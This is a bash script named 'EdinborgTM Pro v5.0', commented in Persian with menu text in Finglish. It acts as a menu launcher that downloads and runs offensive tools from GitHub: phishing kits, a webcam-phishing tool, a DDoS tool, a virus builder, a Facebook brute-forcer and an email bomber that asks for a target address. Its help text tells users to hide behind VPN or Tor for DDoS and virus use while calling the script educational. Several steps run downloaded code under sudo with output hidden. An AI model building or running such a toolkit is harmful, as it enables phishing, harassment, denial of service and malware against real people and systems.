#!/bin/bash
# --------------------------------------------------------------
#  EdinborgTM Pro v5.0 – Binary Intro + Clean Menu
# --------------------------------------------------------------

RED='\033[31;1m'
GREEN='\033[32;1m'
YELLOW='\033[33;1m'
BLUE='\033[34;1m'
MAGENTA='\033[35;1m'
CYAN='\033[36;1m'
WHITE='\033[37;1m'
GRAY='\033[90m'
NC='\033[0m'

# تبدیل متن به باینری (8 بیتی)
text_to_binary() {
    local text="$1"
    local binary=""
    for (( i=0; i<${#text}; i++ )); do
        char="${text:$i:1}"
        ascii=$(printf '%d' "'$char")
        bin=$(echo "obase=2; $ascii" | bc)
        binary+=$(printf '%08d ' "$bin")
    done
    echo "$binary"
}

# انیمیشن باینری پویا
binary_intro() {
    clear
    local text="Tim EdinborgTM taghdim mikonad"
    local binary=$(text_to_binary "$text")
    local lines=()

    # تقسیم باینری به خطوط
    IFS=' ' read -ra bits <<< "$binary"
    local line=""
    local count=0
    for bit in "${bits[@]}"; do
        line+="$bit "
        ((count++))
        if (( count % 8 == 0 )); then
            lines+=("$line")
            line=""
        fi
    done
    [[ -n $line ]] && lines+=("$line")

    # نمایش متحرک
    for _ in {1..4}; do
        clear
        echo
        echo -e "${CYAN}╔═══════════════════════════════════════════════════════╗${NC}"
        for line in "${lines[@]}"; do
            echo -e "${CYAN}║${WHITE}  $line${CYAN}║${NC}"
        done
        echo -e "${CYAN}╚═══════════════════════════════════════════════════════╝${NC}"
        echo
        echo -e "${YELLOW}                Tim EdinborgTM taghdim mikonad...${NC}"
        sleep 0.7
    done

    # نمایش نهایی
    clear
    echo
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║${WHITE}        Tim EdinborgTM taghdim mikonad...            ${GREEN}║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════╝${NC}"
    echo
    sleep 1.5
}

# اسپینر فقط برای نصب
spinner() {
    local pid=$1
    local spin='|/-\'
    while kill -0 $pid 2>/dev/null; do
        for c in {0..3}; do
            printf "${CYAN}%s${NC} " "${spin:$c:1}"
            sleep 0.15
            printf "\b\b"
        done
    done
    printf "  \b\b"
    echo -e "${GREEN}Done${NC}"
}

# منو ساده
menu() {
    local sym=(">" ">" ">" ">" ">" ">" ">" ">" ">" ">" ">" ">" ">" ">" ">" ">" "X" "?")
    local txt=(
        "Taghir khodkar IP" "RED_HAWK" "Fish Tool" "HackerPro" "IP Info"
        "WebCam Hack" "DDOS Attack" "VirusCrafter" "BadMod" "Info-Site"
        "Gmail Bomber" "dorks-eye" "Subscan" "DARKARMY" "Facebash"
        "Update & Req" "Pak kon Tools" "Chejoori estefade?"
    )
    clear
    echo -e "${YELLOW}               ──── ${WHITE}EdinborgTM${YELLOW} ────${NC}"
    echo -e "${CYAN}                    v5.0 ${GREEN}| CTRL+C: khorooj${NC}"
    echo -e "${MAGENTA}╾──────────────────────────────────────────────────────────╼${NC}"
    for i in {0..17}; do
        printf "${WHITE}  [${GREEN}%02d${WHITE}] ${CYAN}%s${NC} %-20s" "$((i+1))" "${sym[$i]}" "${txt[$i]}"
        (( i%2 == 1 )) && echo
    done
    echo
    echo -e "${MAGENTA}╾──────────────────────────────────────────────────────────╼${NC}"
}

# ورودی تمیز
read_option() {
    printf "${GREEN}>> ${WHITE}Nomre gozine (01-18): ${NC}"
    read islem
    [[ ! $islem =~ ^[0-9]+$ ]] && islem=99
    (( islem < 1 || islem > 18 )) && islem=99
}

# اجرای انیمیشن اولیه
binary_intro

# حلقه اصلی
while true; do
    menu
    read_option

    case $islem in
        1|01)
            clear; menu
            echo -e "${GREEN}> Daram nasb AUTO-IP-CHANGER...${NC}"
            mkdir -p Tools && cd Tools
            sudo apt-get install -y tor >/dev/null 2>&1 &
            spinner $!
            pip3 install -q requests
            git clone https://github.com/FDX100/Auto_Tor_IP_changer.git >/dev/null 2>&1 &
            spinner $!
            cd Auto_Tor_IP_changer
            echo -e "${BLUE}Proxy: 127.0.0.1:9050${NC}"
            python3 install.py
            printf "${GREEN}Enter baraye bargasht...${NC}"; read
            ;;
        2|02)
            clear; menu; echo -e "${GREEN}> Nasb RED_HAWK...${NC}"
            mkdir -p Tools && cd Tools
            git clone https://github.com/Tuhinshubhra/RED_HAWK >/dev/null 2>&1 &
            spinner $!
            cd RED_HAWK
            php rhawk.php
            printf "${GREEN}Enter baraye menoo...${NC}"; read
            ;;
        3|03)
            clear; menu; echo -e "${GREEN}> Nasb Fish Tool...${NC}"
            mkdir -p Tools && cd Tools
            git clone https://github.com/htr-tech/zphisher >/dev/null 2>&1 &
            spinner $!
            cd zphisher
            bash zphisher.sh
            printf "${GREEN}Enter baraye bargasht...${NC}"; read
            ;;
        4|04)
            clear; menu; echo -e "${GREEN}> Nasb HackerPro...${NC}"
            mkdir -p Tools && cd Tools
            sudo apt update -y && sudo apt install -y git python2 >/dev/null 2>&1 &
            spinner $!
            git clone https://github.com/jaykali/hackerpro.git >/dev/null 2>&1 &
            spinner $!
            cd hackerpro && sudo bash install.sh >/dev/null 2>&1
            python2 hackerpro.py
            printf "${GREEN}Enter baraye menoo...${NC}"; read
            ;;
        5|05)
            clear; menu; echo -e "${GREEN}> Nasb IP Info...${NC}"
            mkdir -p Tools && cd Tools
            sudo apt install -y git curl >/dev/null 2>&1 &
            spinner $!
            git clone https://github.com/htr-tech/track-ip.git >/dev/null 2>&1 &
            spinner $!
            cd track-ip
            bash trackip
            printf "${GREEN}Enter baraye bargasht...${NC}"; read
            ;;
        6|06)
            clear; menu; echo -e "${GREEN}> Nasb CamPhish...${NC}"
            mkdir -p Tools && cd Tools
            git clone https://github.com/techchipnet/CamPhish >/dev/null 2>&1 &
            spinner $!
            cd CamPhish
            bash camphish.sh
            printf "${GREEN}Enter baraye menoo...${NC}"; read
            ;;
        7|07)
            clear; menu; echo -e "${GREEN}> Nasb DDOS...${NC}"
            mkdir -p Tools && cd Tools
            git clone https://github.com/palahsu/DDoS-Ripper.git >/dev/null 2>&1 &
            spinner $!
            cd DDoS-Ripper
            echo -e "${RED}Warning: IP ro hide kon!${NC}"
            python3 DRipper.py
            printf "${GREEN}Enter baraye menoo...${NC}"; read
            ;;
        8|08)
            clear; menu; echo -e "${GREEN}> Nasb VirusCrafter...${NC}"
            mkdir -p Tools && cd Tools
            git clone https://github.com/Devil-Tigers/TigerVirus >/dev/null 2>&1 &
            spinner $!
            cd TigerVirus
            bash app.sh
            printf "${GREEN}Enter baraye bargasht...${NC}"; read
            ;;
        9|09)
            clear; menu; echo -e "${GREEN}> Nasb BadMod...${NC}"
            mkdir -p Tools && cd Tools
            sudo apt-get update -y && sudo apt-get install -y php php-curl >/dev/null 2>&1 &
            spinner $!
            git clone https://github.com/MrSqar-Ye/BadMod.git >/dev/null 2>&1 &
            spinner $!
            cd BadMod && chmod +x *
            sudo php BadMod.php
            printf "${GREEN}Enter baraye menoo...${NC}"; read
            ;;
        10)
            clear; menu; echo -e "${GREEN}> Nasb Info-Site...${NC}"
            mkdir -p Tools && cd Tools
            pkg install -y curl git >/dev/null 2>&1 &
            spinner $!
            git clone https://github.com/king-hacking/info-site.git >/dev/null 2>&1 &
            spinner $!
            cd info-site
            bash info.sh
            printf "${GREEN}Enter baraye bargasht...${NC}"; read
            ;;
        11)
            clear; menu; echo -e "${GREEN}> Nasb Gmail Bomber...${NC}"
            mkdir -p Tools && cd Tools
            git clone https://github.com/juzeon/fast-mail-bomber.git >/dev/null 2>&1 &
            spinner $!
            cd fast-mail-bomber
            mv config.example.php config.php
            php index.php update-providers >/dev/null 2>&1
            printf "${GREEN}Email hadeaf: ${NC}"; read mail
            php index.php start-bombing "$mail"
            printf "${GREEN}Enter baraye menoo...${NC}"; read
            ;;
        12)
            clear; menu; echo -e "${GREEN}> Nasb dorks-eye...${NC}"
            mkdir -p Tools && cd Tools
            git clone https://github.com/BullsEye0/dorks-eye.git >/dev/null 2>&1 &
            spinner $!
            cd dorks-eye
            pip install -q -r requirements.txt
            python3 dorks-eye.py
            printf "${GREEN}Enter baraye menoo...${NC}"; read
            ;;
        13)
            clear; menu; echo -e "${GREEN}> Nasb Subscan...${NC}"
            mkdir -p Tools && cd Tools
            git clone https://github.com/zidansec/subscan >/dev/null 2>&1 &
            spinner $!
            cd subscan
            printf "${GREEN}Domain: ${NC}"; read sc
            ./subscan "$sc"
            printf "${GREEN}Enter baraye menoo...${NC}"; read
            ;;
        14)
            clear; menu; echo -e "${GREEN}> Nasb DARKARMY...${NC}"
            mkdir -p Tools && cd Tools
            pkg install -y git python2 >/dev/null 2>&1 &
            spinner $!
            git clone https://github.com/D4RK-4RMY/DARKARMY >/dev/null 2>&1 &
            spinner $!
            cd DARKARMY && chmod +x darkarmy.py
            python2 darkarmy.py
            printf "${GREEN}Enter baraye menoo...${NC}"; read
            ;;
        15)
            clear; menu; echo -e "${GREEN}> Nasb Facebash...${NC}"
            mkdir -p Tools && cd Tools
            git clone https://github.com/fu8uk1/facebash >/dev/null 2>&1 &
            spinner $!
            cd facebash
            bash install.sh >/dev/null 2>&1
            chmod +x facebash.sh
            tor >/dev/null 2>&1 &
            ./facebash.sh
            printf "${GREEN}Enter baraye menoo...${NC}"; read
            ;;
        16)
            clear; menu; echo -e "${GREEN}> Update va niazha...${NC}"
            pkg install -y git python python3 pip pip3 curl >/dev/null 2>&1
            sudo apt update -y && sudo apt upgrade -y >/dev/null 2>&1 &
            spinner $!
            echo -e "${GREEN}Done Update shod!${NC}"
            sleep 1
            ;;
        17)
            clear; menu; echo -e "${RED}X Pak kardane Tools...${NC}"
            rm -rf Tools
            echo -e "${GREEN}Done Hamash pak shod!${NC}"
            sleep 2
            ;;
        18)
            clear; menu
            cat <<'HELP'
? Rahnama:
   1. Nomre gozine ro vared kon.
   2. Sabr kon ta nasb tamoom beshe.
   3. Baraye DDOS ya Virus: VPN ya Tor estefade kon.
   4. Baraye khorooj: CTRL+C
   Warning: Faghat baraye amoozeshi!
HELP
            printf "${GREEN}Enter baraye bargasht...${NC}"; read
            ;;
        99|*)
            clear
            echo -e "${RED}Error: Gozine eshtebah! 01-18 vared kon.${NC}"
            sleep 2
            ;;
    esac
done
